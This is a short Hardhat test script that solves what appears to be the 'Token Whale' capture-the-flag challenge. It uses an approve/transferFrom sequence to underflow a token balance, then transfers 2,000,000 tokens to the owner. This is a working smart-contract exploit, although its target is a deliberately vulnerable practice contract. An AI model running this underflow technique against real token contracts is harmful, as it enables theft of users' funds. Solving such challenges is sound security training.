const {loadFixture} = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("TokenWhaleChallenge", function () {
    describe("Becoming a Whale", function () {
        it("Exploiting...", async function () {
            const [owner, alice] = await ethers.getSigners();
            const instanceAddr = "0x8ce6A92F2F73049764d01Cf91d78438b1bFa54B5";
           
            const instance = await ethers.getContractAt("ITokenWhaleChallenge", instanceAddr);
            
            const tx1 = await instance.connect(owner).approve(alice.address, 1);
            await tx1.wait;
            const tx2 = await instance.connect(alice).transferFrom(owner.address, ethers.constants.AddressZero, 1);
            await tx2.wait;
            const tx3 = await instance.connect(alice).transfer(owner.address, 2000000);
            await tx3.wait;

        });
    });
});